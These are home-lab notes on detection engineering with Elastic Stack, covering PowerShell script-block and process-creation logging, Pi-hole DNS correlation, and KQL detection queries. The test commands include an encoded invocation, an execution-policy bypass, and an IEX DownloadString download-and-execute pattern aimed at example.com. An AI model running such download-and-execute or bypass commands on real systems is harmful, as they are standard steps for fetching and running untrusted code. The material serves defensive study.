# SIEM Lab Notes

## Overview
Hands-on SIEM and detection engineering lab using Elastic Stack.  
This lab focuses on detecting suspicious Windows and PowerShell activity using real telemetry and custom detection queries.

***

## Lab Environment

### 🔹 Core Infrastructure

- VMware Workstation
- Windows Server 2025 (Domain Controller)
- Windows 11 Endpoint (Detection Testing System)
- Ubuntu Server (Elastic Stack / Wazuh Host)

---

### 🔹 Raspberry Pi Systems

- Raspberry Pi 5
  - Docker + Portainer
  - Used for containerized lab services and future security tooling

- Raspberry Pi 3B+
  - Pi-hole DNS server
  - Provides DNS logging and network-level visibility

---

### 🔹 Network Architecture

This lab uses a **segmented dual-network design** to simulate real-world environments:

#### ✅ Lab Network (Host-Only)
- Subnet: `<lab-network>`
- Systems:
  - Windows 11 Endpoint
  - Ubuntu (Elastic / Kibana)
- Purpose:
  - Internal SIEM communication
  - Log ingestion and detection analysis

---

#### ✅ Home / External Network (Bridged)
- Subnet: `<external-network>`
- Systems:
  - Windows 11 Endpoint
  - Raspberry Pi (Pi-hole)
- Purpose:
  - DNS traffic monitoring
  - Simulated outbound network activity

---

### 🔹 Dual-Network VM Configuration

The Windows 11 endpoint is configured with **two network interfaces**:

- Adapter 1:
  - `<external-ip>`
  - Connected to Pi-hole for DNS monitoring

- Adapter 2:
  - `<lab-ip>`
  - Connected to Elastic SIEM environment

---

### 🔹 Telemetry Sources

This lab collects and correlates data from multiple sources:

| Source | Description |
|------|------------|
| Event ID 4104 | PowerShell Script Block Logging (command visibility) |
| Event ID 4688 | Process Creation (execution + process trees) |
| Pi-hole DNS Logs | Network activity (domain lookups) |

---

### ✅ Lab Goal

This environment is designed to simulate real-world detection engineering workflows by combining:

- Endpoint telemetry (PowerShell + Process Logs)
- Network telemetry (DNS activity)
- SIEM-based analysis and detection logic

The goal is to build detections that reflect **complete attack behavior across multiple data sources**, rather than relying on a single log type.

***

## PowerShell Detection Labs

***

### 🔹 Encoded PowerShell Command Detection

Test Command:

```powershell
powershell -enc SQBFAFgAIAAiAFQARQBTAFQAIgA=
```

Observed Behavior:
- Command was base64 encoded but decoded and executed as:

```powershell
IEX "TEST"
```

Detection:
- Event ID: 4104 (Script Block Logging)

Field used:

```text
powershell.file.script_block_text
```

Example Result:

```text
Creating Scriptblock text (1 of 1):
IEX "TEST"
```

***

### 🔹 Execution Policy Bypass Detection

Test Command:

```powershell
IEX "Set-ExecutionPolicy Bypass -Scope Process -Force"
```

Observed Behavior:
- Command logged successfully in Script Block Logging (4104)

Detection Queries:

```kql
event.dataset: "windows.powershell_operational"
and event.code: 4104
```

```kql
event.dataset: "windows.powershell_operational"
and event.code: 4104
and powershell.file.script_block_text: *ExecutionPolicy*
```

***

### 🔹 PowerShell Download Detection (Web Requests)

Test Commands:

```powershell
Invoke-WebRequest http://example.com
```

```powershell
IEX (New-Object Net.WebClient).DownloadString("https://example.com")
```

Observed Behavior:
- PowerShell initiated outbound web requests
- Script Block Logging (4104) captured execution

***

### Detection Rule (Elastic)

```kql
event.code: "4104" AND powershell.file.script_block_text: ("*DownloadString*" OR "*Invoke-WebRequest*")
```

***

### 🔹 PowerShell Child Process Detection (4688)

Test Command:

```powershell
powershell.exe -NoProfile -Command "whoami"
```

***

### ✅ Observed Behavior

- PowerShell executed a command that launched another process (`whoami.exe`)
- Event ID 4688 captured process creation

Example:

```text
process.name: whoami.exe
process.parent.name: powershell.exe
```

***

### 🔹 PowerShell + DNS Correlation Detection (Multi-Source)

Test Command:

```text
powershell
Invoke-WebRequest http://example.com
```

***

### ✅ Observed Behavior

- PowerShell execution captured (4104)
- Process activity recorded (4688)
- DNS query logged:

```text
<endpoint-ip> → example.com
```

***

### ✅ Example Investigation Narrative

PowerShell was used to execute a web request (`Invoke-WebRequest`).  
The activity was confirmed via Script Block Logging (4104), supported by process creation logs (4688), and correlated with DNS activity observed in Pi-hole.

***

## Key Concepts Learned

- Script Block Logging reveals actual PowerShell execution
- Encoded commands are decoded in logs
- Detection should focus on behavior, not raw input
- Multi-source correlation improves detection confidence

***

## Detection Strategy Notes

- Start broad, then refine queries
- Validate detections with real telemetry
- Focus on behavior instead of exact strings
- Correlate endpoint and network data

***

## Key Learnings

- PowerShell logging is critical for visibility  
- Detection requires tuning and validation  
- Endpoint logs alone are not enough  
- Combining DNS + process + script data improves analysis  

***

## Next Steps

- Detect encoded PowerShell using Event ID 4688
- Correlate multiple log sources automatically
- Integrate Pi-hole logs into Elastic for full pipeline detection
